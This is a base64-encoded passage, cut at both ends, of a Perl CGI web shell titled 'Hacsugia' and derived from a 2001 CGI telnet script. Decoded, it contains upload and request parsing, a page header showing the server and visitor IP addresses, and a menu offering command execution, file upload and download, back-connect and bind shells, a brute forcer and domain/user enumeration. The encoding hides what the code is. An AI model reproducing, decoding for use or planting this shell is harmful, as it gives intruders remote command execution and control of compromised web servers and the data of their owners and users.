xNTA7DQokcm93cz0gMjY7DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFJlYWRzIHRoZSBpbnB1dCBzZW50IGJ5IHRoZSBicm93c2VyIGFuZCBwYXJzZXMgdGhlIGlucHV0IHZhcmlhYmxlcy4gSXQNCiMgcGFyc2VzIEdFVCwgUE9TVCBhbmQgbXVsdGlwYXJ0L2Zvcm0tZGF0YSB0aGF0IGlzIHVzZWQgZm9yIHVwbG9hZGluZyBmaWxlcy4NCiMgVGhlIGZpbGVuYW1lIGlzIHN0b3JlZCBpbiAkaW57J2YnfSBhbmQgdGhlIGRhdGEgaXMgc3RvcmVkIGluICRpbnsnZmlsZWRhdGEnfS4NCiMgT3RoZXIgdmFyaWFibGVzIGNhbiBiZSBhY2Nlc3NlZCB1c2luZyAkaW57J3Zhcid9LCB3aGVyZSB2YXIgaXMgdGhlIG5hbWUgb2YNCiMgdGhlIHZhcmlhYmxlLiBOb3RlOiBNb3N0IG9mIHRoZSBjb2RlIGluIHRoaXMgZnVuY3Rpb24gaXMgdGFrZW4gZnJvbSBvdGhlciBDR0kNCiMgc2NyaXB0cy4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBSZWFkUGFyc2UgDQp7DQoJbG9jYWwgKCppbikgPSBAXyBpZiBAXzsNCglsb2NhbCAoJGksICRsb2MsICRrZXksICR2YWwpOw0KCQ0KCSRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOw0KDQoJaWYoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAiR0VUIikNCgl7DQoJCSRpbiA9ICRFTlZ7J1FVRVJZX1NUUklORyd9Ow0KCX0NCgllbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikNCgl7DQoJCWJpbm1vZGUoU1RESU4pIGlmICRNdWx0aXBhcnRGb3JtRGF0YSAmICRXaW5OVDsNCgkJcmVhZChTVERJTiwgJGluLCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsNCgl9DQoNCgkjIGhhbmRsZSBmaWxlIHVwbG9hZCBkYXRhDQoJaWYoJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBib3VuZGFyeT0oLispJC8pDQoJew0KCQkkQm91bmRhcnkgPSAnLS0nLiQxOyAjIHBsZWFzZSByZWZlciB0byBSRkMxODY3IA0KCQlAbGlzdCA9IHNwbGl0KC8kQm91bmRhcnkvLCAkaW4pOyANCgkJJEhlYWRlckJvZHkgPSAkbGlzdFsxXTsNCgkJJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOw0KCQkkSGVhZGVyID0gJGA7DQoJCSRCb2R5ID0gJCc7DQogCQkkQm9keSA9fiBzL1xyXG4kLy87ICMgdGhlIGxhc3QgXHJcbiB3YXMgcHV0IGluIGJ5IE5ldHNjYXBlDQoJCSRpbnsnZmlsZWRhdGEnfSA9ICRCb2R5Ow0KCQkkSGVhZGVyID1+IC9maWxlbmFtZT1cIiguKylcIi87IA0KCQkkaW57J2YnfSA9ICQxOyANCgkJJGlueydmJ30gPX4gcy9cIi8vZzsNCgkJJGlueydmJ30gPX4gcy9ccy8vZzsNCg0KCQkjIHBhcnNlIHRyYWlsZXINCgkJZm9yKCRpPTI7ICRsaXN0WyRpXTsgJGkrKykNCgkJeyANCgkJCSRsaXN0WyRpXSA9fiBzL14uK25hbWU9JC8vOw0KCQkJJGxpc3RbJGldID1+IC9cIihcdyspXCIvOw0KCQkJJGtleSA9ICQxOw0KCQkJJHZhbCA9ICQnOw0KCQkJJHZhbCA9fiBzLyheKFxyXG5cclxufFxuXG4pKXwoXHJcbiR8XG4kKS8vZzsNCgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkaW57JGtleX0gPSAkdmFsOyANCgkJfQ0KCX0NCgllbHNlICMgc3RhbmRhcmQgcG9zdCBkYXRhICh1cmwgZW5jb2RlZCwgbm90IG11bHRpcGFydCkNCgl7DQoJCUBpbiA9IHNwbGl0KC8mLywgJGluKTsNCgkJZm9yZWFjaCAkaSAoMCAuLiAkI2luKQ0KCQl7DQoJCQkkaW5bJGldID1+IHMvXCsvIC9nOw0KCQkJKCRrZXksICR2YWwpID0gc3BsaXQoLz0vLCAkaW5bJGldLCAyKTsNCgkJCSRrZXkgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KCQkJJGlueyRrZXl9IC49ICJcMCIgaWYgKGRlZmluZWQoJGlueyRrZXl9KSk7DQoJCQkkaW57JGtleX0gLj0gJHZhbDsNCgkJfQ0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgUGFnZSBIZWFkZXINCiMgQXJndW1lbnQgMTogRm9ybSBpdGVtIG5hbWUgdG8gd2hpY2ggZm9jdXMgc2hvdWxkIGJlIHNldA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50UGFnZUhlYWRlcg0Kew0KCSRFbmNvZGVkQ3VycmVudERpciA9ICRDdXJyZW50RGlyOw0KCSRFbmNvZGVkQ3VycmVudERpciA9fiBzLyhbXmEtekEtWjAtOV0pLyclJy51bnBhY2soIkgqIiwkMSkvZWc7DQoJbXkgJGRpciA9JEN1cnJlbnREaXI7DQoJJGRpcj1+IHMvXFwvXFxcXC9nOw0KCXByaW50ICJDb250ZW50LXR5cGU6IHRleHQvaHRtbFxuXG4iOw0KCXByaW50IDw8RU5EOw0KPGh0bWw+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9ImNvbnRlbnQtdHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PVVURi04Ij4NCjx0aXRsZT5IYWNzdWdpYTwvdGl0bGU+DQoNCiRIdG1sTWV0YUhlYWRlcg0KDQo8L2hlYWQ+DQo8c3R5bGU+DQpib2R5ew0KZm9udDogMTBwdCBWZXJkYW5hOw0KfQ0KdHIgew0KQk9SREVSLVJJR0hUOiAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItVE9QOiAgICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1MRUZUOiAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUJPVFRPTTogIzNlM2UzZSAxcHggc29saWQ7DQpjb2xvcjogI2ZmOTkwMDsNCn0NCnRkIHsNCkJPUkRFUi1SSUdIVDogICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1CT1RUT006ICMzZTNlM2UgMXB4IHNvbGlkOw0KY29sb3I6ICMyQkE4RUM7DQpmb250OiAxMHB0IFZlcmRhbmE7DQp9DQoNCnRhYmxlIHsNCkJPUkRFUi1SSUdIVDogICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1CT1RUT006ICMzZTNlM2UgMXB4IHNvbGlkOw0KQkFDS0dST1VORC1DT0xPUjogIzExMTsNCn0NCg0KDQppbnB1dCB7DQpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUxFRlQ6ICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsNCkJBQ0tHUk9VTkQtQ09MT1I6IEJsYWNrOw0KZm9udDogMTBwdCBWZXJkYW5hOw0KY29sb3I6ICNmZjk5MDA7DQp9DQoNCmlucHV0LnN1Ym1pdCB7DQp0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47DQpjb2xvcjogI0ZGRkZGRjsNCmJvcmRlci1jb2xvcjogIzAwOTkwMDsNCn0NCg0KY29kZSB7DQpib3JkZXIJCQk6IGRhc2hlZCAwcHggIzMzMzsNCkJBQ0tHUk9VTkQtQ09MT1I6IEJsYWNrOw0KZm9udDogMTBwdCBWZXJkYW5hIGJvbGQ7DQpjb2xvcjogd2hpbGU7DQp9DQoNCnJ1biB7DQpib3JkZXIJCQk6IGRhc2hlZCAwcHggIzMzMzsNCmZvbnQ6IDEwcHQgVmVyZGFuYSBib2xkOw0KY29sb3I6ICNGRjAwQUE7DQp9DQoNCnRleHRhcmVhIHsNCkJPUkRFUi1SSUdIVDogICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1CT1RUT006ICMzZTNlM2UgMXB4IHNvbGlkOw0KQkFDS0dST1VORC1DT0xPUjogIzFiMWIxYjsNCmZvbnQ6IEZpeGVkc3lzIGJvbGQ7DQpjb2xvcjogI2FhYTsNCn0NCkE6bGluayB7DQoJQ09MT1I6ICMyQkE4RUM7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KQTp2aXNpdGVkIHsNCglDT0xPUjogIzJCQThFQzsgVEVYVC1ERUNPUkFUSU9OOiBub25lDQp9DQpBOmhvdmVyIHsNCgl0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47DQoJY29sb3I6ICNmZjk5MDA7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KQTphY3RpdmUgew0KCWNvbG9yOiBSZWQ7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KDQoubGlzdGRpciB0cjpob3ZlcnsNCgliYWNrZ3JvdW5kOiAjNDQ0Ow0KfQ0KLmxpc3RkaXIgdHI6aG92ZXIgdGR7DQoJYmFja2dyb3VuZDogIzQ0NDsNCgl0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47DQoJY29sb3I6ICNGRkZGRkY7IFRFWFQtREVDT1JBVElPTjogbm9uZTsNCn0NCi5ub3RsaW5lew0KCWJhY2tncm91bmQ6ICMxMTE7DQp9DQoubGluZXsNCgliYWNrZ3JvdW5kOiAjMjIyOw0KfQ0KPC9zdHlsZT4NCjxzY3JpcHQgbGFuZ3VhZ2U9ImphdmFzY3JpcHQiPg0KZnVuY3Rpb24gY2htb2RfZm9ybShpLGZpbGUpDQp7DQoJLyp2YXIgYWpheD0nYWpheF9Qb3N0RGF0YSgiRm9ybVBlcm1zXycraSsnIiwiJFNjcmlwdExvY2F0aW9uIiwiUmVzcG9uc2VEYXRhIik7IHJldHVybiBmYWxzZTsnOyovDQoJdmFyIGFqYXg9IiI7DQoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVQZXJtc18iK2kpLmlubmVySFRNTD0iPGZvcm0gbmFtZT1Gb3JtUGVybXNfIiArIGkrICIgYWN0aW9uPScgbWV0aG9kPSdQT1NUJz48aW5wdXQgaWQ9dGV4dF8iICsgaSArICIgIG5hbWU9Y2htb2QgdHlwZT10ZXh0IHNpemU9NSAvPjxpbnB1dCB0eXBlPXN1Ym1pdCBjbGFzcz0nc3VibWl0JyBvbmNsaWNrPSciICsgYWpheCArICInIHZhbHVlPU9LPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWEgdmFsdWU9J2d1aSc+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZCB2YWx1ZT0nJGRpcic+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZiB2YWx1ZT0nIitmaWxlKyInPjwvZm9ybT4iOw0KCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ0ZXh0XyIgKyBpKS5mb2N1cygpOw0KfQ0KZnVuY3Rpb24gcm1fY2htb2RfZm9ybShyZXNwb25zZSxpLHBlcm1zLGZpbGUpDQp7DQoJcmVzcG9uc2UuaW5uZXJIVE1MID0gIjxzcGFuIG9uY2xpY2s9XFxcImNobW9kX2Zvcm0oIiArIGkgKyAiLCciKyBmaWxlKyAiJylcXFwiID4iKyBwZXJtcyArIjwvc3Bhbj48L3RkPiI7DQp9DQpmdW5jdGlvbiByZW5hbWVfZm9ybShpLGZpbGUsZikNCnsNCgl2YXIgYWpheD0iIjsNCglmLnJlcGxhY2UoL1xcXFwvZywiXFxcXFxcXFwiKTsNCgl2YXIgYmFjaz0icm1fcmVuYW1lX2Zvcm0oIitpKyIsXFxcIiIrZmlsZSsiXFxcIixcXFwiIitmKyJcXFwiKTsgcmV0dXJuIGZhbHNlOyI7DQoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9Ijxmb3JtIG5hbWU9Rm9ybVBlcm1zXyIgKyBpKyAiIGFjdGlvbj0nIG1ldGhvZD0nUE9TVCc+PGlucHV0IGlkPXRleHRfIiArIGkgKyAiICBuYW1lPXJlbmFtZSB0eXBlPXRleHQgdmFsdWU9ICciK2ZpbGUrIicgLz48aW5wdXQgdHlwZT1zdWJtaXQgY2xhc3M9J3N1Ym1pdCcgb25jbGljaz0nIiArIGFqYXggKyAiJyB2YWx1ZT1PSz48aW5wdXQgdHlwZT1zdWJtaXQgY2xhc3M9J3N1Ym1pdCcgb25jbGljaz0nIiArIGJhY2sgKyAiJyB2YWx1ZT1DYW5jZWw+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YSB2YWx1ZT0nZ3VpJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1kIHZhbHVlPSckZGlyJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1mIHZhbHVlPSciK2ZpbGUrIic+PC9mb3JtPiI7DQoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInRleHRfIiArIGkpLmZvY3VzKCk7DQp9DQpmdW5jdGlvbiBybV9yZW5hbWVfZm9ybShpLGZpbGUsZikNCnsNCglpZihmPT0nZicpDQoJew0KCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZV8iK2kpLmlubmVySFRNTD0iPGEgaHJlZj0nP2E9Y29tbWFuZCZkPSRkaXImYz1lZGl0JTIwIitmaWxlKyIlMjAnPiIgK2ZpbGUrICI8L2E+IjsNCgl9ZWxzZQ0KCXsNCgkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9IjxhIGhyZWY9Jz9hPWd1aSZkPSIrZisiJz5bICIgK2ZpbGUrICIgXTwvYT4iOw0KCX0NCn0NCjwvc2NyaXB0Pg0KPGJvZHkgb25Mb2FkPSJkb2N1bWVudC5mLkBfLmZvY3VzKCkiIGJnY29sb3I9IiMwYzBjMGMiIHRvcG1hcmdpbj0iMCIgbGVmdG1hcmdpbj0iMCIgbWFyZ2lud2lkdGg9IjAiIG1hcmdpbmhlaWdodD0iMCI+DQo8Y2VudGVyPjxjb2RlPg0KPHRhYmxlIGJvcmRlcj0iMSIgd2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMiI+DQo8dHI+DQoJPHRkIGFsaWduPSJjZW50ZXIiIHJvd3NwYW49Mj4NCgkJPGI+PGZvbnQgc2l6ZT0iNSI+JEVkaXRQZXJzaW9uPC9mb250PjwvYj4NCgk8L3RkPg0KDQoJPHRkPg0KDQoJCTxmb250IGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiPiRFTlZ7IlNFUlZFUl9TT0ZUV0FSRSJ9PC9mb250Pg0KCTwvdGQ+DQoJPHRkPlNlcnZlciBJUDo8Zm9udCBjb2xvcj0iI2JiMDAwMCI+ICRFTlZ7J1NFUlZFUl9BRERSJ308L2ZvbnQ+IHwgWW91ciBJUDogPGZvbnQgY29sb3I9IiNiYjAwMDAiPiRFTlZ7J1JFTU9URV9BRERSJ308L2ZvbnQ+DQoJPC90ZD4NCg0KPC90cj4NCg0KPHRyPg0KPHRkIGNvbHNwYW49IjMiPjxmb250IGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiPg0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uIj5Ib21lPC9hPiB8IA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9Y29tbWFuZCZkPSRFbmNvZGVkQ3VycmVudERpciI+Q29tbWFuZDwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9Z3VpJmQ9JEVuY29kZWRDdXJyZW50RGlyIj5HVUk8L2E+IHwgDQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT11cGxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPlVwbG9hZCBGaWxlPC9hPiB8IA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPkRvd25sb2FkIEZpbGU8L2E+IHwNCg0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9YmFja2JpbmQiPkJhY2sgJiBCaW5kPC9hPiB8DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1icnV0ZWZvcmNlciI+QnJ1dGUgRm9yY2VyPC9hPiB8DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1jaGVja2xvZyI+Q2hlY2sgTG9nPC9hPiB8DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1kb21haW5zdXNlciI+RG9tYWlucy9Vc2VyczwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9bG9nb3V0Ij5Mb2dvdXQ8L2E+IHwNCjxhIHRhcmdldD0nX2JsYW5rJyBocmVmPSIjIj5IZWxwPC9hPg0KDQo8L2ZvbnQ+PC90ZD4NCjwvdHI+DQo8L3RhYmxlPg0KPGZvbnQgaWQ9IlJlc3BvbnNlRGF0YSIgY29sb3I9IiNmZjk5Y2MiID4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgTG9naW4gU2NyZWVuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dpblNjcmVlbg0Kew0KDQoJcHJpbnQgPDxFTkQ7DQo8cHJlPjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4NClR5cGluZ1RleHQgPSBmdW5jdGlvbihlbGVtZW50LCBpbnRlcnZhbCwgY3Vyc29yLCBmaW5pc2hlZENhbGxiYWNrKSB7DQogIGlmKCh0eXBlb2YgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQgPT0gInVuZGVmaW5lZCIpIHx8ICh0eXBlb2YgZWxlbWVudC5pbm5lckhUTUwgPT0gInVuZGVmaW5lZCIpKSB7DQogICAgdGhpcy5ydW5uaW5nID0gdHJ1ZTsJLy8gTmV2ZXIgcnVuLg0KICAgIHJldHVybjsNCiAgfQ0KICB0aGlzLmVsZW1lbnQgPSBlbGVtZW50Ow0KICB0aGlzLmZpbmlzaGVkQ2FsbGJhY2sgPSAoZmluaXNoZWRDYWxsYmFjayA/IGZpbmlzaGVkQ2FsbGJhY2sgOiBmdW5jdGlvbigpIHsgcmV0dXJuOyB9KTsNCiAgdGhpcy5pbnRlcnZhbCA9ICh0eXBlb2YgaW50ZXJ2YWwgPT0gInVuZGVmaW5lZCIgPyAxMDAgOiBpbnRlcnZhbCk7DQogIHRoaXMub3JpZ1RleHQgPSB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MOw0KICB0aGlzLnVucGFyc2VkT3JpZ1RleHQgPSB0aGlzLm9yaWdUZXh0Ow0KICB0aGlzLmN1cnNvciA9IChjdXJzb3IgPyBjdXJzb3IgOiAiIik7DQogIHRoaXMuY3VycmVudFRleHQgPSAiIjsNCiAgdGhpcy5jdXJyZW50Q2hhciA9IDA7DQogIHRoaXMuZWxlbWVudC50eXBpbmdUZXh0ID0gdGhpczsNCiAgaWYodGhpcy5lbGVtZW50LmlkID09ICIiKSB0aGlzLmVsZW1lbnQuaWQgPSAidHlwaW5ndGV4dCIgKyBUeXBpbmdUZXh0LmN1cnJlbnRJbmRleCsrOw0KICBUeXBpbmdUZXh0LmFsbC5wdXNoKHRoaXMpOw0KICB0aGlzLnJ1bm5pbmcgPSBmYWxzZTsNCiAgdGhpcy5pblRhZyA9IGZhbHNlOw0KICB0aGlzLnRhZ0J1ZmZlciA9ICIiOw0KICB0aGlzLmluSFRNTEVudGl0eSA9IGZhbHNlOw0KICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgPSAiIjsNCn0NClR5cGluZ1RleHQuYWxsID0gbmV3IEFycmF5KCk7DQpUeXBpbmdUZXh0LmN1cnJlbnRJbmRleCA9IDA7DQpUeXBpbmdUZXh0LnJ1bkFsbCA9IGZ1bmN0aW9uKCkgew0KICBmb3IodmFyIGkgPSAwOyBpIDwgVHlwaW5nVGV4dC5hbGwubGVuZ3RoOyBpKyspIFR5cGluZ1RleHQuYWxsW2ldLnJ1bigpOw0KfQ0KVHlwaW5nVGV4dC5wcm90b3R5cGUucnVuID0gZnVuY3Rpb24oKSB7DQogIGlmKHRoaXMucnVubmluZykgcmV0dXJuOw0KICBpZih0eXBlb2YgdGhpcy5vcmlnVGV4dCA9PSAidW5kZWZpbmVkIikgew0KICAgIHNldFRpbWVvdXQoImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCciICsgdGhpcy5lbGVtZW50LmlkICsgIicpLnR5cGluZ1RleHQucnVuKCkiLCB0aGlzLmludGVydmFsKTsJLy8gV2UgaGF2ZW4ndCBmaW5pc2hlZCBsb2FkaW5nIHlldC4gIEhhdmUgcGF0aWVuY2UuDQogICAgcmV0dXJuOw0KICB9DQogIGlmKHRoaXMuY3VycmVudFRleHQgPT0gIiIpIHRoaXMuZWxlbWVudC5pbm5lckhUTUwgPSAiIjsNCi8vICB0aGlzLm9yaWdUZXh0ID0gdGhpcy5vcmlnVGV4dC5yZXBsYWNlKC88KFtePF0pKj4vLCAiIik7ICAgICAvLyBTdHJpcCBIVE1MIGZyb20gdGV4dC4NCiAgaWYodGhpcy5jdXJyZW50Q2hhciA8IHRoaXMub3JpZ1RleHQubGVuZ3RoKSB7DQogICAgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIjwiICYmICF0aGlzLmluVGFnKSB7DQogICAgICB0aGlzLnRhZ0J1ZmZlciA9ICI8IjsNCiAgICAgIHRoaXMuaW5UYWcgPSB0cnVlOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2UgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIj4iICYmIHRoaXMuaW5UYWcpIHsNCiAgICAgIHRoaXMudGFnQnVmZmVyICs9ICI+IjsNCiAgICAgIHRoaXMuaW5UYWcgPSBmYWxzZTsNCiAgICAgIHRoaXMuY3VycmVudFRleHQgKz0gdGhpcy50YWdCdWZmZXI7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSBpZih0aGlzLmluVGFnKSB7DQogICAgICB0aGlzLnRhZ0J1ZmZlciArPSB0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKTsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICImIiAmJiAhdGhpcy5pbkhUTUxFbnRpdHkpIHsNCiAgICAgIHRoaXMuSFRNTEVudGl0eUJ1ZmZlciA9ICImIjsNCiAgICAgIHRoaXMuaW5IVE1MRW50aXR5ID0gdHJ1ZTsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICI7IiAmJiB0aGlzLmluSFRNTEVudGl0eSkgew0KICAgICAgdGhpcy5IVE1MRW50aXR5QnVmZmVyICs9ICI7IjsNCiAgICAgIHRoaXMuaW5IVE1MRW50aXR5ID0gZmFsc2U7DQogICAgICB0aGlzLmN1cnJlbnRUZXh0ICs9IHRoaXMuSFRNTEVudGl0eUJ1ZmZlcjsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIGlmKHRoaXMuaW5IVE1MRW50aXR5KSB7DQogICAgICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgKz0gdGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcik7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSB7DQogICAgICB0aGlzLmN1cnJlbnRUZXh0ICs9IHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpOw0KICAgIH0NCiAgICB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MID0gdGhpcy5jdXJyZW50VGV4dDsNCiAgICB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MICs9ICh0aGlzLmN1cnJlbnRDaGFyIDwgdGhpcy5vcmlnVGV4dC5sZW5ndGggLSAxID8gKHR5cGVvZiB0aGlzLmN1cnNvciA9PSAiZnVuY3Rpb24iID8gdGhpcy5jdXJzb3IodGhpcy5jdXJyZW50VGV4dCkgOiB0aGlzLmN1cnNvcikgOiAiIik7DQogICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgIHNldFRpbWVvdXQoImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCciICsgdGhpcy5lbGVtZW50LmlkICsgIicpLnR5cGluZ1RleHQucnVuKCkiLCB0aGlzLmludGVydmFsKTsNCiAgfSBlbHNlIHsNCgl0aGlzLmN1cnJlbnRUZXh0ID0gIiI7DQoJdGhpcy5jdXJyZW50Q2hhciA9IDA7DQogICAgICAgIHRoaXMucnVubmluZyA9IGZhbHNlOw0KICAgICAgICB0aGlzLmZpbmlzaGVkQ2FsbGJhY2soKTsNCiAgfQ0KfQ0KPC9zY3JpcHQ+DQo8L3ByZT4NCg0KPGZvbnQgc3R5bGU9ImZvbnQ6IDE1cHQgVmVyZGFuYTsgY29sb3I6IHllbGxvdzsiPkNvcHlyaWdodCAoQykgMjAwMSBSb2hpdGFiIEJhdHJhIDwvZm9udD48YnI+PGJyPg0KPHRhYmxlIGFsaWduPSJjZW50ZXIiIGJvcmRlcj0iMSIgd2lkdGg9IjYwMCIgaGVpZ2g+DQo8dGJvZHk+PHRyPg0KPHRkIHZhbGlnbj0idG9wIiBiYWNrZ3JvdW5kPSJodHRwOi8vZGwuZHJvcGJveC5jb20vdS8xMDg2MDA1MS9pbWFnZXMvbWF0cmFuLmdpZiI+PHAgaWQ9ImhhY2siIHN0eWxlPSJtYXJnaW4tbGVmdDogM3B4OyI+DQo8Zm9udCBjb2xvcj0iIzAwOTkwMCI+IFBsZWFzZSBXYWl0IC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+IDxicj4NCg0KPGZvbnQgY29sb3I9IiMwMDk5MDAiPiBUcnlpbmcgY29ubmVjdCB0byBTZXJ2ZXIgLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLjwvZm9udD